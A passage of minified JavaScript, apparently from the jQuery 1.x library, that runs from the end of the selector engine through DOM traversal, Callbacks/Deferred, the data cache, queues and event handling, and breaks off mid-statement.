            ;
            x.apply(c, m), d && !a && m.length > 0 && v + n.length > 1 && r.uniqueSort(c);
          }
          ;
          return d && (p = C, M = w), b;
        };
      return i ? d(a) : a;
    }
    ;
    return Q = r.compile = function (e, t) {
      var r,
        i = [],
        o = [],
        n = Z[e + " "];
      if (!n) {
        t || (t = j(e)), r = t.length;
        while (r--) n = R(t[r]), n[a] ? i.push(n) : o.push(n);
        n = Z(e, fe(o, i)), n.selector = e;
      }
      ;
      return n;
    }, oe = r.select = function (e, n, r, o) {
      var l,
        a,
        s,
        d,
        p,
        c = "function" == typeof e && e,
        u = !o && j(e = c.selector || e);
      if (r = r || [], 1 === u.length) {
        if (a = u[0] = u[0].slice(0), a.length > 2 && "ID" === (s = a[0]).type && i.getById && 9 === n.nodeType && f && t.relative[a[1].type]) {
          if (n = (t.find.ID(s.matches[0].replace(g, m), n) || [])[0], !n) return r;
          c && (n = n.parentNode), e = e.slice(a.shift().value.length);
        }
        ;
        l = L.needsContext.test(e) ? 0 : a.length;
        while (l--) {
          if (s = a[l], t.relative[d = s.type]) break;
          if ((p = t.find[d]) && (o = p(s.matches[0].replace(g, m), P.test(a[0].type) && X(n.parentNode) || n))) {
            if (a.splice(l, 1), e = o.length && q(a), !e) return x.apply(r, o), r;
            break;
          }
        }
      }
      ;
      return (c || Q(e, u))(o, n, !f, r, P.test(e) && X(n.parentNode) || n), r;
    }, i.sortStable = a.split("").sort(J).join("") === a, i.detectDuplicates = !!k, y(), i.sortDetached = u(function (e) {
      return 1 & e.compareDocumentPosition(s.createElement("div"));
    }), u(function (e) {
      return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href");
    }) || V("type|href|height|width", function (e, t, n) {
      return n ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
    }), i.attributes && u(function (e) {
      return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value");
    }) || V("value", function (e, t, n) {
      return n || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue;
    }), u(function (e) {
      return null == e.getAttribute("disabled");
    }) || V(G, function (e, t, n) {
      var r;
      return n ? void 0 : e[t] === !0 ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null;
    }), r;
  }(t);
  e.find = N, e.expr = N.selectors, e.expr[":"] = e.expr.pseudos, e.unique = N.uniqueSort, e.text = N.getText, e.isXMLDoc = N.isXML, e.contains = N.contains;
  var xe = e.expr.match.needsContext,
    be = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
    fn = /^.[^:#\[\.,]*$/;
  function ae(t, n, r) {
    if (e.isFunction(n)) return e.grep(t, function (e, t) {
      return !!n.call(e, t, e) !== r;
    });
    if (n.nodeType) return e.grep(t, function (e) {
      return e === n !== r;
    });
    if ("string" == typeof n) {
      if (fn.test(n)) return e.filter(n, t, r);
      n = e.filter(n, t);
    }
    ;
    return e.grep(t, function (t) {
      return e.inArray(t, n) >= 0 !== r;
    });
  }
  ;
  e.filter = function (t, n, r) {
    var i = n[0];
    return r && (t = ":not(" + t + ")"), 1 === n.length && 1 === i.nodeType ? e.find.matchesSelector(i, t) ? [i] : [] : e.find.matches(t, e.grep(n, function (e) {
      return 1 === e.nodeType;
    }));
  }, e.fn.extend({
    find: function (t) {
      var n,
        r = [],
        i = this,
        o = i.length;
      if ("string" != typeof t) return this.pushStack(e(t).filter(function () {
        for (n = 0; o > n; n++) if (e.contains(i[n], this)) return !0;
      }));
      for (n = 0; o > n; n++) e.find(t, i[n], r);
      return r = this.pushStack(o > 1 ? e.unique(r) : r), r.selector = this.selector ? this.selector + " " + t : t, r;
    },
    filter: function (e) {
      return this.pushStack(ae(this, e || [], !1));
    },
    not: function (e) {
      return this.pushStack(ae(this, e || [], !0));
    },
    is: function (t) {
      return !!ae(this, "string" == typeof t && xe.test(t) ? e(t) : t || [], !1).length;
    }
  });
  var j,
    i = t.document,
    sn = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,
    an = e.fn.init = function (t, n) {
      var r, o;
      if (!t) return this;
      if ("string" == typeof t) {
        if (r = "<" === t.charAt(0) && ">" === t.charAt(t.length - 1) && t.length >= 3 ? [null, t, null] : sn.exec(t), !r || !r[1] && n) return !n || n.jquery ? (n || j).find(t) : this.constructor(n).find(t);
        if (r[1]) {
          if (n = n instanceof e ? n[0] : n, e.merge(this, e.parseHTML(r[1], n && n.nodeType ? n.ownerDocument || n : i, !0)), be.test(r[1]) && e.isPlainObject(n)) for (r in n) e.isFunction(this[r]) ? this[r](n[r]) : this.attr(r, n[r]);
          return this;
        }
        ;
        if (o = i.getElementById(r[2]), o && o.parentNode) {
          if (o.id !== r[2]) return j.find(t);
          this.length = 1, this[0] = o;
        }
        ;
        return this.context = i, this.selector = t, this;
      }
      ;
      return t.nodeType ? (this.context = this[0] = t, this.length = 1, this) : e.isFunction(t) ? "undefined" != typeof j.ready ? j.ready(t) : t(e) : (void 0 !== t.selector && (this.selector = t.selector, this.context = t.context), e.makeArray(t, this));
    };
  an.prototype = e.fn, j = e(i);
  var cn = /^(?:parents|prev(?:Until|All))/,
    un = {
      children: !0,
      contents: !0,
      next: !0,
      prev: !0
    };
  e.extend({
    dir: function (t, n, r) {
      var o = [],
        i = t[n];
      while (i && 9 !== i.nodeType && (void 0 === r || 1 !== i.nodeType || !e(i).is(r))) 1 === i.nodeType && o.push(i), i = i[n];
      return o;
    },
    sibling: function (e, t) {
      for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
      return n;
    }
  }), e.fn.extend({
    has: function (t) {
      var n,
        r = e(t, this),
        i = r.length;
      return this.filter(function () {
        for (n = 0; i > n; n++) if (e.contains(this, r[n])) return !0;
      });
    },
    closest: function (t, n) {
      for (var r, o = 0, s = this.length, i = [], a = xe.test(t) || "string" != typeof t ? e(t, n || this.context) : 0; s > o; o++) for (r = this[o]; r && r !== n; r = r.parentNode) if (r.nodeType < 11 && (a ? a.index(r) > -1 : 1 === r.nodeType && e.find.matchesSelector(r, t))) {
        i.push(r);
        break;
      }
      ;
      return this.pushStack(i.length > 1 ? e.unique(i) : i);
    },
    index: function (t) {
      return t ? "string" == typeof t ? e.inArray(this[0], e(t)) : e.inArray(t.jquery ? t[0] : t, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
    },
    add: function (t, n) {
      return this.pushStack(e.unique(e.merge(this.get(), e(t, n))));
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    }
  });
  function He(e, t) {
    do e = e[t]; while (e && 1 !== e.nodeType);
    return e;
  }
  ;
  e.each({
    parent: function (e) {
      var t = e.parentNode;
      return t && 11 !== t.nodeType ? t : null;
    },
    parents: function (t) {
      return e.dir(t, "parentNode");
    },
    parentsUntil: function (t, n, r) {
      return e.dir(t, "parentNode", r);
    },
    next: function (e) {
      return He(e, "nextSibling");
    },
    prev: function (e) {
      return He(e, "previousSibling");
    },
    nextAll: function (t) {
      return e.dir(t, "nextSibling");
    },
    prevAll: function (t) {
      return e.dir(t, "previousSibling");
    },
    nextUntil: function (t, n, r) {
      return e.dir(t, "nextSibling", r);
    },
    prevUntil: function (t, n, r) {
      return e.dir(t, "previousSibling", r);
    },
    siblings: function (t) {
      return e.sibling((t.parentNode || {}).firstChild, t);
    },
    children: function (t) {
      return e.sibling(t.firstChild);
    },
    contents: function (t) {
      return e.nodeName(t, "iframe") ? t.contentDocument || t.contentWindow.document : e.merge([], t.childNodes);
    }
  }, function (t, n) {
    e.fn[t] = function (r, i) {
      var o = e.map(this, n, r);
      return "Until" !== t.slice(-5) && (i = r), i && "string" == typeof i && (o = e.filter(i, o)), this.length > 1 && (un[t] || (o = e.unique(o)), cn.test(t) && (o = o.reverse())), this.pushStack(o);
    };
  });
  var c = /\S+/g,
    he = {};
  function Vt(t) {
    var n = he[t] = {};
    return e.each(t.match(c) || [], function (e, t) {
      n[t] = !0;
    }), n;
  }
  ;
  e.Callbacks = function (t) {
    t = "string" == typeof t ? he[t] || Vt(t) : e.extend({}, t);
    var s,
      i,
      u,
      o,
      a,
      c,
      n = [],
      r = !t.once && [],
      d = function (e) {
        for (i = t.memory && e, u = !0, a = c || 0, c = 0, o = n.length, s = !0; n && o > a; a++) if (n[a].apply(e[0], e[1]) === !1 && t.stopOnFalse) {
          i = !1;
          break;
        }
        ;
        s = !1, n && (r ? r.length && d(r.shift()) : i ? n = [] : l.disable());
      },
      l = {
        add: function () {
          if (n) {
            var r = n.length;
            !function a(r) {
              e.each(r, function (r, i) {
                var o = e.type(i);
                "function" === o ? t.unique && l.has(i) || n.push(i) : i && i.length && "string" !== o && a(i);
              });
            }(arguments), s ? o = n.length : i && (c = r, d(i));
          }
          ;
          return this;
        },
        remove: function () {
          return n && e.each(arguments, function (t, r) {
            var i;
            while ((i = e.inArray(r, n, i)) > -1) n.splice(i, 1), s && (o >= i && o--, a >= i && a--);
          }), this;
        },
        has: function (t) {
          return t ? e.inArray(t, n) > -1 : !(!n || !n.length);
        },
        empty: function () {
          return n = [], o = 0, this;
        },
        disable: function () {
          return n = r = i = void 0, this;
        },
        disabled: function () {
          return !n;
        },
        lock: function () {
          return r = void 0, i || l.disable(), this;
        },
        locked: function () {
          return !r;
        },
        fireWith: function (e, t) {
          return !n || u && !r || (t = t || [], t = [e, t.slice ? t.slice() : t], s ? r.push(t) : d(t)), this;
        },
        fire: function () {
          return l.fireWith(this, arguments), this;
        },
        fired: function () {
          return !!u;
        }
      };
    return l;
  }, e.extend({
    Deferred: function (t) {
      var i = [["resolve", "done", e.Callbacks("once memory"), "resolved"], ["reject", "fail", e.Callbacks("once memory"), "rejected"], ["notify", "progress", e.Callbacks("memory")]],
        o = "pending",
        r = {
          state: function () {
            return o;
          },
          always: function () {
            return n.done(arguments).fail(arguments), this;
          },
          then: function () {
            var t = arguments;
            return e.Deferred(function (o) {
              e.each(i, function (i, a) {
                var s = e.isFunction(t[i]) && t[i];
                n[a[1]](function () {
                  var t = s && s.apply(this, arguments);
                  t && e.isFunction(t.promise) ? t.promise().done(o.resolve).fail(o.reject).progress(o.notify) : o[a[0] + "With"](this === r ? o.promise() : this, s ? [t] : arguments);
                });
              }), t = null;
            }).promise();
          },
          promise: function (t) {
            return null != t ? e.extend(t, r) : r;
          }
        },
        n = {};
      return r.pipe = r.then, e.each(i, function (e, t) {
        var a = t[2],
          s = t[3];
        r[t[1]] = a.add, s && a.add(function () {
          o = s;
        }, i[1 ^ e][2].disable, i[2][2].lock), n[t[0]] = function () {
          return n[t[0] + "With"](this === n ? r : this, arguments), this;
        }, n[t[0] + "With"] = a.fireWith;
      }), r.promise(n), t && t.call(n, n), n;
    },
    when: function (t) {
      var n = 0,
        i = m.call(arguments),
        r = i.length,
        a = 1 !== r || t && e.isFunction(t.promise) ? r : 0,
        o = 1 === a ? t : e.Deferred(),
        u = function (e, t, n) {
          return function (r) {
            t[e] = this, n[e] = arguments.length > 1 ? m.call(arguments) : r, n === s ? o.notifyWith(t, n) : --a || o.resolveWith(t, n);
          };
        },
        s,
        c,
        l;
      if (r > 1) for (s = new Array(r), c = new Array(r), l = new Array(r); r > n; n++) i[n] && e.isFunction(i[n].promise) ? i[n].promise().done(u(n, l, i)).fail(o.reject).progress(u(n, c, s)) : --a;
      return a || o.resolveWith(l, i), o.promise();
    }
  });
  var H;
  e.fn.ready = function (t) {
    return e.ready.promise().done(t), this;
  }, e.extend({
    isReady: !1,
    readyWait: 1,
    holdReady: function (t) {
      t ? e.readyWait++ : e.ready(!0);
    },
    ready: function (t) {
      if (t === !0 ? ! --e.readyWait : !e.isReady) {
        if (!i.body) return setTimeout(e.ready);
        e.isReady = !0, t !== !0 && --e.readyWait > 0 || (H.resolveWith(i, [e]), e.fn.triggerHandler && (e(i).triggerHandler("ready"), e(i).off("ready")));
      }
    }
  });
  function ct() {
    i.addEventListener ? (i.removeEventListener("DOMContentLoaded", h, !1), t.removeEventListener("load", h, !1)) : (i.detachEvent("onreadystatechange", h), t.detachEvent("onload", h));
  }
  ;
  function h() {
    (i.addEventListener || "load" === event.type || "complete" === i.readyState) && (ct(), e.ready());
  }
  ;
  e.ready.promise = function (n) {
    if (!H) if (H = e.Deferred(), "complete" === i.readyState) setTimeout(e.ready);else if (i.addEventListener) i.addEventListener("DOMContentLoaded", h, !1), t.addEventListener("load", h, !1);else {
      i.attachEvent("onreadystatechange", h), t.attachEvent("onload", h);
      var o = !1;
      try {
        o = null == t.frameElement && i.documentElement;
      } catch (r) {}
      ;
      o && o.doScroll && !function a() {
        if (!e.isReady) {
          try {
            o.doScroll("left");
          } catch (t) {
            return setTimeout(a, 50);
          }
          ;
          ct(), e.ready();
        }
      }();
    }
    ;
    return H.promise(n);
  };
  var u = "undefined",
    ue;
  for (ue in e(r)) break;
  r.ownLast = "0" !== ue, r.inlineBlockNeedsLayout = !1, e(function () {
    var o, t, e, n;
    e = i.getElementsByTagName("body")[0], e && e.style && (t = i.createElement("div"), n = i.createElement("div"), n.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", e.appendChild(n).appendChild(t), typeof t.style.zoom !== u && (t.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1", r.inlineBlockNeedsLayout = o = 3 === t.offsetWidth, o && (e.style.zoom = 1)), e.removeChild(n));
  }), function () {
    var t = i.createElement("div");
    if (null == r.deleteExpando) {
      r.deleteExpando = !0;
      try {
        delete t.test;
      } catch (e) {
        r.deleteExpando = !1;
      }
    }
    ;
    t = null;
  }(), e.acceptData = function (t) {
    var n = e.noData[(t.nodeName + " ").toLowerCase()],
      r = +t.nodeType || 1;
    return 1 !== r && 9 !== r ? !1 : !n || n !== !0 && t.getAttribute("classid") === n;
  };
  var nn = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    dn = /([A-Z])/g;
  function tt(t, n, r) {
    if (void 0 === r && 1 === t.nodeType) {
      var o = "data-" + n.replace(dn, "-$1").toLowerCase();
      if (r = t.getAttribute(o), "string" == typeof r) {
        try {
          r = "true" === r ? !0 : "false" === r ? !1 : "null" === r ? null : +r + "" === r ? +r : nn.test(r) ? e.parseJSON(r) : r;
        } catch (i) {}
        ;
        e.data(t, n, r);
      } else r = void 0;
    }
    ;
    return r;
  }
  ;
  function le(t) {
    var n;
    for (n in t) if (("data" !== n || !e.isEmptyObject(t[n])) && "toJSON" !== n) return !1;
    return !0;
  }
  ;
  function Le(t, n, r, i) {
    if (e.acceptData(t)) {
      var l,
        a,
        u = e.expando,
        c = t.nodeType,
        s = c ? e.cache : t,
        o = c ? t[u] : t[u] && u;
      if (o && s[o] && (i || s[o].data) || void 0 !== r || "string" != typeof n) return o || (o = c ? t[u] = p.pop() || e.guid++ : u), s[o] || (s[o] = c ? {} : {
        toJSON: e.noop
      }), ("object" == typeof n || "function" == typeof n) && (i ? s[o] = e.extend(s[o], n) : s[o].data = e.extend(s[o].data, n)), a = s[o], i || (a.data || (a.data = {}), a = a.data), void 0 !== r && (a[e.camelCase(n)] = r), "string" == typeof n ? (l = a[n], null == l && (l = a[e.camelCase(n)])) : l = a, l;
    }
  }
  ;
  function De(t, n, i) {
    if (e.acceptData(t)) {
      var s,
        l,
        u = t.nodeType,
        o = u ? e.cache : t,
        a = u ? t[e.expando] : e.expando;
      if (o[a]) {
        if (n && (s = i ? o[a] : o[a].data)) {
          e.isArray(n) ? n = n.concat(e.map(n, e.camelCase)) : n in s ? n = [n] : (n = e.camelCase(n), n = n in s ? [n] : n.split(" ")), l = n.length;
          while (l--) delete s[n[l]];
          if (i ? !le(s) : !e.isEmptyObject(s)) return;
        }
        (i || (delete o[a].data, le(o[a]))) && (u ? e.cleanData([t], !0) : r.deleteExpando || o != o.window ? delete o[a] : o[a] = null);
      }
    }
  }
  ;
  e.extend({
    cache: {},
    noData: {
      "applet ": !0,
      "embed ": !0,
      "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
    },
    hasData: function (t) {
      return t = t.nodeType ? e.cache[t[e.expando]] : t[e.expando], !!t && !le(t);
    },
    data: function (e, t, n) {
      return Le(e, t, n);
    },
    removeData: function (e, t) {
      return De(e, t);
    },
    e$: function (e, t, n) {
      return Le(e, t, n, !0);
    },
    n$: function (e, t) {
      return De(e, t, !0);
    }
  }), e.fn.extend({
    data: function (t, n) {
      var o,
        i,
        a,
        r = this[0],
        s = r && r.attributes;
      if (void 0 === t) {
        if (this.length && (a = e.data(r), 1 === r.nodeType && !e.e$(r, "parsedAttrs"))) {
          o = s.length;
          while (o--) s[o] && (i = s[o].name, 0 === i.indexOf("data-") && (i = e.camelCase(i.slice(5)), tt(r, i, a[i])));
          e.e$(r, "parsedAttrs", !0);
        }
        ;
        return a;
      }
      ;
      return "object" == typeof t ? this.each(function () {
        e.data(this, t);
      }) : arguments.length > 1 ? this.each(function () {
        e.data(this, t, n);
      }) : r ? tt(r, t, e.data(r, t)) : void 0;
    },
    removeData: function (t) {
      return this.each(function () {
        e.removeData(this, t);
      });
    }
  }), e.extend({
    queue: function (t, n, r) {
      var i;
      return t ? (n = (n || "fx") + "queue", i = e.e$(t, n), r && (!i || e.isArray(r) ? i = e.e$(t, n, e.makeArray(r)) : i.push(r)), i || []) : void 0;
    },
    dequeue: function (t, n) {
      n = n || "fx";
      var r = e.queue(t, n),
        a = r.length,
        i = r.shift(),
        o = e.r$(t, n),
        s = function () {
          e.dequeue(t, n);
        };
      "inprogress" === i && (i = r.shift(), a--), i && ("fx" === n && r.unshift("inprogress"), delete o.stop, i.call(t, s, o)), !a && o && o.empty.fire();
    },
    r$: function (t, n) {
      var r = n + "queueHooks";
      return e.e$(t, r) || e.e$(t, r, {
        empty: e.Callbacks("once memory").add(function () {
          e.n$(t, n + "queue"), e.n$(t, r);
        })
      });
    }
  }), e.fn.extend({
    queue: function (t, n) {
      var r = 2;
      return "string" != typeof t && (n = t, t = "fx", r--), arguments.length < r ? e.queue(this[0], t) : void 0 === n ? this : this.each(function () {
        var r = e.queue(this, t, n);
        e.r$(this, t), "fx" === t && "inprogress" !== r[0] && e.dequeue(this, t);
      });
    },
    dequeue: function (t) {
      return this.each(function () {
        e.dequeue(this, t);
      });
    },
    clearQueue: function (e) {
      return this.queue(e || "fx", []);
    },
    promise: function (t, n) {
      var r,
        o = 1,
        a = e.Deferred(),
        i = this,
        s = this.length,
        l = function () {
          --o || a.resolveWith(i, [i]);
        };
      "string" != typeof t && (n = t, t = void 0), t = t || "fx";
      while (s--) r = e.e$(i[s], t + "queueHooks"), r && r.empty && (o++, r.empty.add(l));
      return l(), a.promise(n);
    }
  });
  var W = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    w = ["Top", "Right", "Bottom", "Left"],
    D = function (t, n) {
      return t = n || t, "none" === e.css(t, "display") || !e.contains(t.ownerDocument, t);
    },
    y = e.access = function (t, n, r, i, o, s, l) {
      var a = 0,
        c = t.length,
        u = null == r;
      if ("object" === e.type(r)) {
        o = !0;
        for (a in r) e.access(t, n, a, r[a], !0, s, l);
      } else if (void 0 !== i && (o = !0, e.isFunction(i) || (l = !0), u && (l ? (n.call(t, i), n = null) : (u = n, n = function (t, n, r) {
        return u.call(e(t), r);
      })), n)) for (; c > a; a++) n(t[a], r, l ? i : i.call(t[a], a, n(t[a], r)));
      return o ? t : u ? n.call(t) : c ? n(t[0], r) : s;
    },
    se = /^(?:checkbox|radio)$/i;
  !function () {
    var n = i.createElement("input"),
      t = i.createElement("div"),
      o = i.createDocumentFragment();
    if (t.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", r.leadingWhitespace = 3 === t.firstChild.nodeType, r.tbody = !t.getElementsByTagName("tbody").length, r.htmlSerialize = !!t.getElementsByTagName("link").length, r.html5Clone = "<:nav></:nav>" !== i.createElement("nav").cloneNode(!0).outerHTML, n.type = "checkbox", n.checked = !0, o.appendChild(n), r.appendChecked = n.checked, t.innerHTML = "<textarea>x</textarea>", r.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue, o.appendChild(t), t.innerHTML = "<input type='radio' checked='checked' name='t'/>", r.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked, r.noCloneEvent = !0, t.attachEvent && (t.attachEvent("onclick", function () {
      r.noCloneEvent = !1;
    }), t.cloneNode(!0).click()), null == r.deleteExpando) {
      r.deleteExpando = !0;
      try {
        delete t.test;
      } catch (e) {
        r.deleteExpando = !1;
      }
    }
  }(), function () {
    var e,
      n,
      o = i.createElement("div");
    for (e in {
      submit: !0,
      change: !0,
      focusin: !0
    }) n = "on" + e, (r[e + "Bubbles"] = n in t) || (o.setAttribute(n, "t"), r[e + "Bubbles"] = o.attributes[n].expando === !1);
    o = null;
  }();
  var ee = /^(?:input|select|textarea)$/i,
    qt = /^key/,
    Xt = /^(?:mouse|pointer|contextmenu)|click/,
    nt = /^(?:focusinfocus|focusoutblur)$/,
    Me = /^([^.]*)(?:\.(.+)|)$/;
  function O() {
    return !0;
  }
  ;
  function k() {
    return !1;
  }
  ;
  function Ae() {
    try {
      return i.activeElement;
    } catch (e) {}
  }
  ;
  e.event = {
    global: {},
    add: function (t, n, r, i, o) {
      var v,
        h,
        g,
        m,
        s,
        l,
        f,
        d,
        a,
        y,
        x,
        p = e.e$(t);
      if (p) {
        r.handler && (m = r, r = m.handler, o = m.selector), r.guid || (r.guid = e.guid++), (h = p.events) || (h = p.events = {}), (l = p.handle) || (l = p.handle = function (t) {
          return typeof e === u || t && e.event.triggered === t.type ? void 0 : e.event.dispatch.apply(l.elem, arguments);
        }, l.elem = t), n = (n || "").match(c) || [""], g = n.length;
        while (g--) v = Me.exec(n[g]) || [], a = x = v[1], y = (v[2] || "").split(".").sort(), a && (s = e.event.special[a] || {}, a = (o ? s.delegateType : s.bindType) || a, s = e.event.special[a] || {}, f = e.extend({
          type: a,
          origType: x,
          data: i,
          handler: r,
          guid: r.guid,
          selector: o,
          needsContext: o && e.expr.match.needsContext.test(o),
          namespace: y.join(".")
        }, m), (d = h[a]) || (d = h[a] = [], d.delegateCount = 0, s.setup && s.setup.call(t, i, y, l) !== !1 || (t.addEventListener ? t.addEventListener(a, l, !1) : t.attachEvent && t.attachEvent("on" + a, l))), s.add && (s.add.call(t, f), f.handler.guid || (f.handler.guid = r.guid)), o ? d.splice(d.delegateCount++, 0, f) : d.push(f), e.event.global[a] = !0);
        t = null;
      }
    },
    remove: function (t, n, r, i, o) {
      var m,
        s,
        u,
        y,
        h,
        p,
        l,
        d,
        a,
        g,
        v,
        f = e.hasData(t) && e.e$(t);
      if (f && (p = f.events)) {
        n = (n || "").match(c) || [""], h = n.length;
        while (h--) if (u = Me.exec(n[h]) || [], a = v = u[1], g = (u[2] || "").split(".").sort(), a) {
          l = e.event.special[a] || {}, a = (i ? l.delegateType : l.bindType) || a, d = p[a] || [], u = u[2] && new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)"), y = m = d.length;
          while (m--) s = d[m], !o && v !== s.origType || r && r.guid !== s.guid || u && !u.test(s.namespace) || i && i !== s.selector && ("**" !== i || !s.selector) || (d.splice(m, 1), s.selector && d.delegateCount--, l.remove && l.remove.call(t, s));
          y && !d.length && (l.teardown && l.teardown.call(t, g, f.handle) !== !1 || e.removeEvent(t, a, f.handle), delete p[a]);
        } else for (a in p) e.event.remove(t, a + n[h], r, i, !0);
        e.isEmptyObject(p) && (delete f.handle, e.n$(t, "events"));
      }
    },
    trigger: function (n, r, o, a) {
      var f,
        p,
        l,
        g,
        d,
        c,
        v,
        m = [o || i],
        u = T.call(n, "type") ? n.type : n,
        h = T.call(n, "namespace") ? n.namespace.split(".") : [];
      if (l = c = o = o || i, 3 !== o.nodeType && 8 !== o.nodeType && !nt.test(u + e.event.triggered) && (u.indexOf(".") >= 0 && (h = u.split("."), u = h.shift(), h.sort()), p = u.indexOf(":") < 0 && "on" + u, n = n[e.expando] ? n : new e.Event(u, "object" == typeof n && n), n.isTrigger = a ? 2 : 3, n.namespace = h.join("."), n.namespace_re = n.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, n.result = void 0, n.target || (n.target = o), r = null == r ? [n] : e.makeArray(r, [n]), d = e.event.special[u] || {}, a || !d.trigger || d.trigger.apply(o, r) !== !1)) {
        if (!a && !d.noBubble && !e.isWindow(o)) {
          for (g = d.delegateType || u, nt.test(g + u) || (l = l.parentNode); l; l = l.parentNode) m.push(l), c = l;
          c === (o.ownerDocument || i) && m.push(c.defaultView || c.parentWindow || t);
        }
        ;
        v = 0;
        while ((l = m[v++]) && !n.isPropagationStopped()) n.type = v > 1 ? g : d.bindType || u, f = (e.e$(l, "events") || {})[n.type] && e.e$(l, "handle"), f && f.apply(l, r), f = p && l[p], f && f.apply && e.acceptData(l) && (n.result = f.apply(l, r), n.result === !1 && n.preventDefault());
        if (n.type = u, !a && !n.isDefaultPrevented() && (!d.t$ || d.t$.apply(m.pop(), r) === !1) && e.acceptData(o) && p && o[u] && !e.isWindow(o)) {
          c = o[p], c && (o[p] = null), e.event.triggered = u;
          try {
            o[u]();
          } catch (s) {}
          ;
          e.event.triggered = void 0, c && (o[p] = c);
        }
        ;
        return n.result;
      }
    },
    dispatch: function (t) {
      t = e.event.fix(t);
      var a,
        o,
        n,
        r,
        s,
        l = [],
        u = m.call(arguments),
        c = (e.e$(this, "events") || {})[t.type] || [],
        i = e.event.special[t.type] || {};
      if (u[0] = t, t.delegateTarget = this, !i.preDispatch || i.preDispatch.call(this, t) !== !1) {
        l = e.event.handlers.call(this, t, c), a = 0;
        while ((r = l[a++]) && !t.isPropagationStopped()) {
          t.currentTarget = r.elem, s = 0;
          while ((n = r.handlers[s++]) && !t.isImmediatePropagationStopped()) (!t.namespace_re || t.namespace_re.test(n.namespace)) && (t.handleObj = n, t.data = n.data, o = ((e.event.special[n.origType] || {}).handle || n.handler).apply(r.elem, u), void 0 !== o && (t.result = o) === !1 && (t.preventDefault(), t.stopPropagation()));
        }
        ;
        return i.postDispatch && i.postDispatch.call(this, t), t.result;
      }
    },
    handlers: function (t, n) {
      var o,
        a,
        i,
        s,
        u = [],
        l = n.delegateCount,
        r = t.target;
      if (l && r.nodeType && (!t.button || "click" !== t.type)) for (; r != this; r = r.parentNode || this) if (1 === r.nodeType && (r.disabled !== !0 || "click" !== t.type)) {
        for (i = [], s = 0; l > s; s++) a = n[s], o = a.selector + " ", void 0 === i[o] && (i[o] = a.needsContext ? e(o, this).index(r) >= 0 : e.find(o, this, null, [r]).length), i[o] && i.push(a);
        i.length && u.push({
          elem: r,
          handlers: i
        });
      }
      ;
      return l < n.length && u.push({
        elem: this,
        handlers: n.slice(l)
      }), u;
    },
    fix: function (t) {
      if (t[e.expando]) return t;
      var a,
        s,
        l,
        r = t.type,
        o = t,
        n = this.fixHooks[r];
      n || (this.fixHooks[r] = n = Xt.test(r) ? this.mouseHooks : qt.test(r) ? this.keyHooks : {}), l = n.props ? this.props.concat(n.props) : this.props, t = new e.Event(o), a = l.length;
      while (a--) s = l[a], t[s] = o[s];
      return t.target || (t.target = o.srcElement || i), 3 === t.target.nodeType && (t.target = t.target.parentNode), t.metaKey = !!t.metaKey, n.filter ? n.filter(t, o) : t;
    },
    props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
    fixHooks: {},
    keyHooks: {
      props: "char charCode key keyCode".split(" "),
      filter: function (e, t) {
        return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e;
      }
    },
    mouseHooks: {
      props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
      filter: function (e, t) {
        var n,
          a,
          r,
          o = t.button,
          s = t.fromElement;
        return null == e.pageX && null != t.clientX && (a = e.target.ownerDocument || i, r = a.documentElement, n = a.body, e.pageX = t.clientX + (r && r.scrollLeft || n && n.scrollLeft || 0) - (r && r.clientLeft || n && n.clientLeft || 0), e.pageY = t.clientY + (r && r.scrollTop || n && n.scrollTop || 0) - (r && r.clientTop || n && n.clientTop || 0)), !e.relatedTarget && s && (e.relatedTarget = s === e.target ? t.toElement : s), e.which || void 0 === o || (e.which = 1 & o ? 1 : 2 & o ? 3 : 4 & o ? 2 : 0), e;
      }
    },
    special: {
      load: {
        noBubble: !0
      },
      focus: {
        trigger: function () {
          if (this !== Ae() && this.focus) try {
            return this.focus(), !1;
          } catch (e) {}
        },
        delegateType: "focusin"
      },
      blur: {
        trigger: function () {
          return this === Ae() && this.blur ? (this.blur(), !1) : void 0;
        },
        delegateType: "focusout"
      },
      click: {
        trigger: function () {
          return e.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : void 0;
        },
        t$: function (t) {
          return e.nodeName(t.target, "a");
        }
      },
      beforeunload: {
        postDispatch: function (e) {
          void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result);
        }
      }
    },
    simulate: function (t, n, r, i) {
      var o = e.extend(new e.Event(), r, {
        type: t,
        isSimulated: !0,
        originalEvent: {}
      });
      i ? e.event.trigger(o, null, n) : e.event.dispatch.call(n, o), o.isDefaultPrevented() && r.preventDefault();
    }
  }, e.removeEvent = i.removeEventListener ? function (e, t, n) {
    e.removeEventListener && e.removeEventListener(t, n, !1);
  } : function (e, t, n) {
    var r = "on" + t;
    e.detachEvent && (typeof e[r] === u && (e[r] = null), e.detachEvent(r, n));
  }, e.Event = function (t, n) {
